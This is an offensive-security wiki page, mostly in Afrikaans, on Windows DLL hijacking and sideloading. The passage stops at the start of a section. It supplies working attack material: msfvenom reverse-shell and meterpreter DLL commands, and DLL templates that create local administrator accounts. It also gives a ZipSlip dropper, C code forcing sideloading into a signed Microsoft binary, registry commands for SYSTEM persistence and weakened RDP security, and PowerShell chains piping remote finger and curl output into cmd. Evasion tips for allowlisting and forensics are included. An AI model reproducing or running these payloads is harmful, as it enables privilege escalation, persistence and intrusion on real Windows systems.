# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basiese Inligting

DLL Hijacking behels die manipulasie van 'n vertroude toepassing om 'n kwaadwillige DLL te laai. Hierdie term sluit verskeie taktieke in soos **DLL Spoofing, Injection, and Side-Loading**. Dit word hoofsaaklik gebruik vir code execution, achieving persistence, en, minder algemeen, privilege escalation. Ten spyte van die fokus op escalation hier, bly die metode van hijacking konsekwent oor doelwitte.

### Algemene Tegnieke

Verskeie metodes word aangewend vir DLL hijacking, en elkeen se doeltreffendheid hang af van die toepassing se DLL-laaipatroon:

1. **DLL Replacement**: Om 'n egte DLL met 'n kwaadwillige een te verruil, opsioneel met gebruik van DLL Proxying om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Plaas die kwaadwillige DLL in 'n soekpad voor die regmatige een, deur die toepassing se soekpatroon uit te buit.
3. **Phantom DLL Hijacking**: Skep 'n kwaadwillige DLL wat 'n toepassing sal laai omdat dit dink dit is 'n noodsaaklike, nie-bestaande DLL.
4. **DLL Redirection**: Verander soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local` lêers om die toepassing na die kwaadwillige DLL te lei.
5. **WinSxS DLL Replacement**: Vervang die regmatige DLL met 'n kwaadwillige eweknie in die WinSxS gids, 'n metode dikwels geassosieer met DLL side-loading.
6. **Relative Path DLL Hijacking**: Plaas die kwaadwillige DLL in 'n deur gebruiker beheerde gids saam met die gekopieerde toepassing, soortgelyk aan Binary Proxy Execution techniques.

> [!TIP]
> Vir 'n stap-vir-stap ketting wat HTML staging, AES-CTR configs, en .NET implants bo-op DLL sideloading laai, sien die workflow hieronder.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Om ontbrekende Dlls te vind

Die mees algemene manier om ontbrekende Dlls in 'n stelsel te vind is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te laat hardloop en die **volgende 2 filters** te stel:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

en net die **File System Activity** te wys:

![](<../../../images/image (153).png>)

As jy oor die algemeen na **ontbrekende DLLs** soek, laat dit vir 'n paar sekondes loop.\
As jy na 'n **ontbrekende DLL binne 'n spesifieke uitvoerbare lêer** soek, stel 'n ander filter soos "Process Name" "contains" `<exec name>`, voer dit uit, en stop die vaslegging van gebeure.

## Exploiting Missing Dlls

Om privileges te eskaleer, is die beste kans dat ons 'n **dll kan skryf wat 'n privilege proses sal probeer laai** in een van die **plekke waar dit gesoek gaan word**. Daarom kan ons 'n **dll** in 'n **gids** skryf waar die **dll eerder gesoek word** as in die gids waar die **oorspronklike dll** is (vreemde geval), of ons kan op 'n **gids** skryf waar die dll gesoek gaan word en die oorspronklike **dll nêrens bestaan nie**.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows-toepassings soek DLLs deur 'n stel voorafgedefinieerde soekbane te volg, en volg 'n bepaalde volgorde. Die probleem van DLL hijacking ontstaan wanneer 'n kwaadwillige DLL strategies in een van hierdie gidse geplaas word, sodat dit gelaai word voordat die egte DLL. 'n Oplossing om dit te voorkom is om te verseker dat die toepassing absolute paadjies gebruik wanneer dit na die vereiste DLLs verwys.

Jy kan die **DLL search order on 32-bit** stelsels hieronder sien:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Dit is die **standaard** soekorde met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer is, skuif die huidige gids na tweede plek. Om hierdie kenmerk uit te skakel, skep die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value en stel dit op 0 (standaard is geaktiveer).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funksie met **LOAD_WITH_ALTERED_SEARCH_PATH** aangeroep word, begin die soektog in die gids van die uitvoerbare module wat **LoadLibraryEx** aan die laai is.

Laastens, neem kennis dat **'n dll gelaai kan word deur die absolute pad aan te gee in plaas van net die naam**. In daardie geval gaan daardie dll **slegs in daardie pad gesoek word** (as die dll enige afhanklikhede het, gaan hulle gesoek word soos net gelaai deur naam).

Daar is ander maniere om die soekorde te verander maar ek gaan dit nie hier verduidelik nie.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Gebruik **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) om DLL name te versamel wat die proses probe maar nie kan vind nie.
2. As die binaire op 'n **skedule/service** loop, sal die neerlegging van 'n DLL met een van daardie name in die **application directory** (soek-orde item #1) op die volgende uitvoering gelaai word. In een .NET scanner-voorbeeld het die proses byvoorbeeld na `hostfxr.dll` in `C:\samples\app\` gesoek voordat dit die regte kopie uit `C:\Program Files\dotnet\fxr\...` gelaai het.
3. Build a payload DLL (e.g. reverse shell) with any export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. If your primitive is a **ZipSlip-style arbitrary write**, craft a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Lewer die argief na die gekykte inbox/share; wanneer die geskeduleerde taak die proses weer herbegin, laai dit die kwaadwillige DLL en voer jou kode uit as die diensrekening.

### Afdwing van sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

'n Gevorderde manier om die DLL-soekpad van 'n pas geskepte proses deterministies te beïnvloed, is om die DllPath-veld in RTL_USER_PROCESS_PARAMETERS te stel wanneer jy die proses skep met ntdll se native APIs. Deur hier 'n deur die aanvaller-beheerde gids te verskaf, kan 'n teikenproses wat 'n geïmporteerde DLL per naam oplos (geen absolute pad en nie die veilige laaivlae gebruik nie) gedwing word om 'n kwaadwillige DLL vanaf daardie gids te laai.

Key idea
- Bou die prosesparameters met RtlCreateProcessParametersEx en verskaf 'n pasgemaakte DllPath wat na jou beheerde gids wys (bv. die gids waar jou dropper/unpacker woon).
- Skep die proses met RtlCreateUserProcess. Wanneer die teiken-binary 'n DLL per naam oplos, sal die loader hierdie verskafte DllPath raadpleeg tydens resolusie, wat betroubare sideloading moontlik maak selfs wanneer die kwaadwillige DLL nie saam met die teiken EXE gelokaliseer is nie.

Notes/limitations
- Dit beïnvloed die kindproses wat geskep word; dit verskil van SetDllDirectory, wat slegs die huidige proses beïnvloed.
- Die teiken moet 'n DLL invoer of via LoadLibrary volgens naam laai (geen absolute pad en nie die gebruik van LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories nie).
- KnownDLLs en hardgekodeerde absolute paaie kan nie gekaap word nie. Forwarded exports en SxS kan die precedensie verander.

Minimale C-voorbeeld (ntdll, wide strings, vereenvoudigde foutbehandeling):

<details>
<summary>Volledige C-voorbeeld: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasionele gebruiksvoorbeeld
- Plaas 'n skadelike xmllite.dll (wat die vereiste funksies uitvoer of na die werklike een proxieer) in jou DllPath-gids.
- Begin 'n getekende binary wat bekend is daarvoor dat dit xmllite.dll per naam opsoek met die bogenoemde metode. Die loader los die import via die verskafte DllPath op en sideloads jou DLL.

Hierdie tegniek is in die natuur waargeneem om multi-stage sideloading-kettings aan te dryf: 'n aanvanklike launcher laat 'n helper DLL val, wat dan 'n Microsoft-signed, hijackable binary met 'n pasgemaakte DllPath spawn om die aanvaller se DLL vanaf 'n staging directory te dwing om gelaai te word.


#### Uitsonderings op die DLL-soekorde uit die Windows-dokumentasie

Sekere uitsonderings op die standaard DLL-soekorde word in die Windows-dokumentasie aangeteken:

- Wanneer 'n **DLL wat dieselfde naam deel as een wat reeds in geheue gelaai is** teëgekom word, omseil die stelsel die gewone soektog. In plaas daarvan voer dit 'n kontrole vir omleiding en 'n manifest uit voordat dit terugval op die DLL wat reeds in geheue is. **In hierdie scenario voer die stelsel nie 'n soektog vir die DLL uit nie**.
- In gevalle waar die DLL as 'n **known DLL** vir die huidige Windows-weergawe herken word, sal die stelsel sy weergawe van die known DLL gebruik, tesame met enige van sy afhanklike DLLs, **sonder om die soektog te doen**. Die register sleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bevat 'n lys van hierdie known DLLs.
- Indien 'n **DLL afhanklikhede het**, word die soektog vir hierdie afhanklike DLLs uitgevoer asof hulle slegs deur hul **module names** aangedui is, ongeag of die aanvanklike DLL deur 'n volledige pad geïdentifiseer is.

### Eskalering van privilegies

**Vereistes**:

- Identifiseer 'n proses wat onder **verskillende voorregte** werk of sal werk (horizontale of laterale beweging), wat **'n DLL ontbreek**.
- Verseker dat **skryf-toegang** beskikbaar is vir enige **gids** waarin die **DLL** **gesoek sal word**. Hierdie ligging kan die gids van die executable wees of 'n gids binne die stelselpad.

Ja, die vereistes is moeilik om te vind aangesien **dit by verstek nogal vreemd is om 'n geprivilegieerde executable te vind wat 'n dll mis** en dit is selfs **vreemder om skryfpermissies op 'n gids in die stelselpad te hê** (jy kan dit nie by verstek hê nie). Maar in verkeerd gekonfigureerde omgewings is dit moontlik.\
In geval jy gelukkig is en aan die vereistes voldoen, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek nagaan. Selfs al is die **hoofdoel van die projek om UAC te omseil**, mag jy daar 'n **PoC** van 'n Dll hijaking vir die Windows-weergawe vind wat jy kan gebruik (waarskynlik net deur die pad van die vouer waarin jy skryfpermissies het te verander).

Let wel dat jy jou **permissies in 'n gids kan nagaan** deur:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer toestemmings van alle vouers binne PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die imports van 'n executable en die exports van 'n dll nagaan met:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Vir 'n volledige gids oor hoe om **Dll Hijacking te misbruik om voorregte te eskaleer** wanneer jy toestemming het om in 'n **System Path folder** te skryf, kyk:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Outomatiese gereedskap

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sal kontroleer of jy skryfpermissies het op enige gids binne system PATH.\
Ander interessante outomatiese gereedskap om hierdie kwesbaarheid te ontdek is **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Voorbeeld

Indien jy 'n uitbuitbare scenario vind, is een van die belangrikste dinge om dit suksesvol te uitbuit om **'n dll te skep wat minstens al die funksies eksporteer wat die uitvoerbare daarvan sal invoer**. Let wel dat Dll Hijacking handig is om te [eskaleer van Medium Integrity-vlak na High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) of van [**High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system). Jy kan 'n voorbeeld vind van **hoe om 'n geldige dll te skep** binne hierdie dll hijacking-studie gefokus op dll hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Boonop kan jy in die **volgende afdeling** sommige **basiese dll-kode** vind wat nuttig kan wees as **templates** of om 'n **dll te skep wat nie-verpligte funksies eksporteer**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basies is 'n **Dll proxy** 'n Dll wat in staat is om **jou kwaadwillige kode uit te voer wanneer dit gelaai word**, maar ook om te **blootstel** en **te werk soos verwag** deur alle oproepe na die werklike biblioteek te herlei.

Met die instrumente [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik **'n uitvoerbare aandui en die biblioteek kies** wat jy wil proxify en **'n proxified dll genereer** of **die Dll aandui** en **'n proxified dll genereer**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (x86 ek het nie 'n x64-weergawe gesien nie):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

Wees bewus dat in verskeie gevalle die Dll wat jy kompileer moet **export several functions** wat deur die victim process gelaai gaan word. As hierdie functions nie bestaan nie, sal die **binary won't be able to load** hulle en die **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-voorbeeld wat 'n gebruiker skep</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatiewe C DLL met thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Gevalstudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe kyk by opstart steeds na 'n voorspelbare, taalspesifieke localization DLL wat ge-hijack kan word vir arbitrary code execution en persistence.

Belangrike feite
- Pad wat geprobeer word (huidige builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Pad in ouer builds: `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- As 'n skryfbare, deur die aanvaller beheerde DLL by die OneCore-pad bestaan, word dit gelaai en `DllMain(DLL_PROCESS_ATTACH)` uitgevoer. Geen exports word benodig nie.

Ontdekking met Procmon
- Filter: `Process Name is Narrator.exe` en `Operation is Load Image` of `CreateFile`.
- Begin Narrator en kyk na die poging om bogenoemde pad te laai.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- 'n naïe hijack sal die UI praat/uitlig. Om stil te bly, tel by aanheg Narrator-drade op, open die hoofdraad (`OpenThread(THREAD_SUSPEND_RESUME)`) en `SuspendThread` dit; gaan voort in jou eie draad. Sien PoC vir die volle kode.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Met hierdie instellings laai die begin van Narrator die geplante DLL. Op die secure desktop (aanmeldskerm), druk CTRL+WIN+ENTER om Narrator te start; jou DLL word as SYSTEM op die secure desktop uitgevoer.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP na die gasheer, op die aanmeldskerm druk CTRL+WIN+ENTER om Narrator te loods; jou DLL word as SYSTEM op die secure desktop uitgevoer.
- Uitvoering stop wanneer die RDP-sessie sluit—inject/migrate vinnig.

Bring Your Own Accessibility (BYOA)
- Jy kan 'n ingeboude Accessibility Tool (AT) registerinskrywing kloon (bv. CursorIndicator), dit wysig om na 'n arbitrêre binary/DLL te verwys, dit importeer, en dan `configuration` op daardie AT-naam stel. Dit fungeer as 'n proxy vir arbitrêre uitvoering binne die Accessibility-raamwerk.

Notes
- Skryf onder `%windir%\System32` en die verander van HKLM-waardes vereis adminregte.
- Al die payload-logika kan in `DLL_PROCESS_ATTACH` leef; geen exports is nodig nie.

## Gevallestudie: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Hierdie geval demonstreer **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), gevolg as **CVE-2025-1729**.

### Kwetsbaarheidsbesonderhede

- **Komponent**: `TPQMAssistant.exe` geleë by `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` loop daagliks om 9:30 vm onder die konteks van die aangemelde gebruiker.
- **Directory Permissions**: Skryfbaar deur `CREATOR OWNER`, wat plaaslike gebruikers toelaat om arbitrêre lêers neer te sit.
- **DLL Search Behavior**: Probeer eers om `hostfxr.dll` uit sy werkgids te laai en loods "NAME NOT FOUND" indien dit ontbreek, wat aandui dat die plaaslike gids eerste deurgesoek word.

### Implementering van die uitbuiting

'n Aanvaller kan 'n kwaadwillige `hostfxr.dll`-stub in dieselfde gids plaas en sodoende die ontbrekende DLL uitbuit om kode-uitvoering onder die gebruiker se konteks te bereik:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Aanvalvloei

1. As 'n standaardgebruiker, plaas `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag vir die geskeduleerde taak om om 9:30 AM in die konteks van die huidige gebruiker te loop.
3. As 'n administrateur aangeteken is wanneer die taak uitgevoer word, loop die kwaadwillige DLL in die administrateur se sessie op medium integrity.
4. Ketting standaard UAC bypass-tegnieke om van medium integrity na SYSTEM-privileges te verhoog.

## Gevalstudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Aanvallers verbonde dikwels MSI-gebaseerde droppers met DLL side-loading om payloads onder 'n betroubare, getekende proses uit te voer.

Chain overview
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI-analise (wat om na te kyk)
- CustomAction tabel:
- Soek na inskrywings wat uitvoerbare lêers of VBScript loop. Voorbeeld van 'n verdagte patroon: LaunchApplication wat 'n ingeslote lêer op die agtergrond uitvoer.
- In Orca (Microsoft Orca.exe), inspekteer CustomAction, InstallExecuteSequence en Binary tables.
- Ingeslote/gespliste payloads in die MSI CAB:
- Administratiewe uittreksel: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Soek na meerdere klein fragmentjies wat samengeheg en gedekodeer word deur 'n VBScript CustomAction. Algemene verloop:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Plaas hierdie twee lêers in dieselfde gids:
- wsc_proxy.exe: legitieme gesigneerde gasheer (Avast). Die proses probeer wsc.dll by naam vanaf sy gids laai.
- wsc.dll: aanvallers DLL. As geen spesifieke exports vereis word nie, kan DllMain volstaan; andersins bou 'n proxy DLL en stuur die vereiste exports na die oorspronklike biblioteek terwyl die payload in DllMain uitgevoer word.
- Bou 'n minimale DLL-payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Vir exportvereistes, gebruik 'n proxy-framework (bv. DLLirant/Spartacus) om 'n forwarding DLL te genereer wat ook jou payload uitvoer.

- Hierdie tegniek berus op DLL-naamresolusie deur die gasheer-binary. As die gasheer absolute paaie of safe loading flags gebruik (bv. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kan die hijack misluk.
- KnownDLLs, SxS, en forwarded exports kan die prioriteit beïnvloed en moet in ag geneem word tydens die keuse van die gasheer-binary en die export-stel.

## Ondertekende triades + geënkripteerde payloads (ShadowPad gevallestudie)

Check Point het beskryf hoe Ink Dragon ShadowPad ontplooi deur 'n **drie-lêer triade** te gebruik om in te meng met legitieme sagteware terwyl die kern-payload op skyf geënkripteer bly:

1. **Signed host EXE** – verskaffers soos AMD, Realtek, of NVIDIA word misbruik (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die aanvalleerders hernoem die uitvoerbare lêer om soos 'n Windows-binary te lyk (bv. `conhost.exe`), maar die Authenticode-handtekening bly geldig.
2. **Malicious loader DLL** – geplaas langs die EXE met 'n verwagte naam (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL is gewoonlik 'n MFC-binary wat met die ScatterBrain-framework geobfuseer is; sy enigste taak is om die geënkripteerde blob te lok, dit te dekripteer, en ShadowPad reflectively te map.
3. **Encrypted payload blob** – dikwels gestoor as `<name>.tmp` in dieselfde gids. Nadat die gedekripteerde payload in geheue gemap is, verwyder die loader die TMP-lêer om forensiese bewyse te vernietig.

Tradecraft notes:

* Deur die ondertekende EXE te hernoem (terwyl die oorspronklike `OriginalFileName` in die PE header behou word) kan dit as 'n Windows-binary vermom, maar steeds die verkoper-handtekening behou. Repliseer Ink Dragon se gewoonte om `conhost.exe`-agtige binaries neer te sit wat eintlik AMD/NVIDIA-hulpmiddels is.
* Aangesien die uitvoerbare lêer vertrou bly, hoef meeste allowlisting-beheer slegs jou kwaadwillige DLL langs dit te hê. Fokus op die aanpassing van die loader DLL; die ondertekende ouer kan gewoonlik onaangeraak loop.
* ShadowPad se decryptor verwag dat die TMP-blob langs die loader lewendig is en skryfbaar sodat dit die lêer na mapping kan zero. Hou die gids skryfbaar totdat die payload laai; sodra dit in geheue is, kan die TMP-lêer veilig verwyder word vir OPSEC.

### LOLBAS stager + gefaseerde argief sideloading-ketting (finger → tar/curl → WMI)

Operateurs kombineer DLL sideloading met LOLBAS sodat die enigste pasgemaakte artefak op skyf die kwaadwillige DLL langs die vertroude EXE is:

- **Remote command loader (Finger):** Verborgen PowerShell spawn `cmd.exe /c`, haal opdragte van 'n Finger-bediener en pipe dit na `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` haal TCP/79-tekst; `| cmd` voer die bediener-antwoord uit, wat operateurs toelaat om die tweede fase bediener-syds te roteer.

- **Built-in download/extract:** Laai 'n argief met 'n skadelose uitbreiding af, pak dit uit, en plaas die sideload-doel plus DLL onder 'n ewekansige `%LocalAppData%`-gids:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` verberg vordering en volg omleidings; `tar -xf` gebruik Windows se ingeboude tar.

- **WMI/CIM launch:** Start die EXE via WMI sodat telemetrie 'n CIM-created proses wys terwyl dit die kolokale DLL laai:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Werk met binaries wat lokale DLLs verkies (bv. `intelbq.exe`, `nearby_share.exe`); payload (bv. Remcos) loop onder die vertroude naam.

- **Hunting:** Waarsku op `forfiles` wanneer `/p`, `/m`, en `/c` saam verskyn; dit is ongewoon buite admin-skripte.

## Gevallestudie: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

'n Onlangse Lotus Blossom indringing het 'n vertroude opdateringsketting misbruik om 'n NSIS-gepakke dropper af te lewer wat 'n DLL sideload en volledig in-geheue payloads gefaseer het.

Tradecraft flow
